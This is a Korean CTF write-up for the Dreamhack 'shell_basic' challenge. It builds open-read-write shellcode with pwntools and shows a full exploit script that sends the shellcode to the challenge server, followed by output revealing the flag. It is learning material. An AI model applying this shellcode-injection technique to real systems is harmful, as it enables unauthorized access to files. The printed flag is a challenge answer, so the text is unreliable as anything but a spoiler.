![](https://velog.velcdn.com/images/silvergun8291/post/29a54698-f366-4dae-929f-2f1678458352/image.png)

문제를 보면 flag를 출력하는 쉘 코드를 작성해야 하는데, execve 시스템 콜을 사용할 수 없습니다.

그래서 강의에서처럼 orw 쉘 코드를 작성해서 문제를 풀어야 합니다.

<br>

```c
// orw
int fd = open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```

위에 코드처럼 open-read-write를 하면 되는데, pwntools에 쉘 코드를 작성해주는 함수인 shellcraft()가 있습니다.
 
<br>

shellcraft() 함수를 이용해서 쉘 코드를 작성해보면

```python
# 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.
context.arch = "amd64"
# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# open() 함수 결과는 rax 레지스터에 저장됩니다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
shellcode = asm(shellcode)	# shellcode를 기계어로 변환하여 대입
```

<br>

전체 익스플로잇 코드를 작성해보면

```python
from pwn import *

p = remote("host1.dreamhack.games", 20000)

# 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.
context.arch = "amd64"
# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# open() 함수 결과는 rax 레지스터에 저장된다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
shellcode = asm(shellcode)	# shellcode를 기계어로 변환

payload = shellcode    # payload = shellcode
p.sendlineafter("shellcode: ", payload)    # "shellcode: "가 출력되면 payload + '\n'을 입력
print(p.recv(0x30))    # p가 출력하는 데이터를 0x30 Byte 까지 받아서 출력
```

<br> 

익스플로잇 코드를 실행시켜보면

```bash
$ python3 shell.py
[+] Opening connection to host1.dreamhack.games on port 20000: Done
b'DH{ca562d7cf1db6c55cb11c4ec350a3c0b}\nong\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Closed connection to host1.dreamhack.games port 20000
```

플래그가 성공적으로 출력되었습니다.
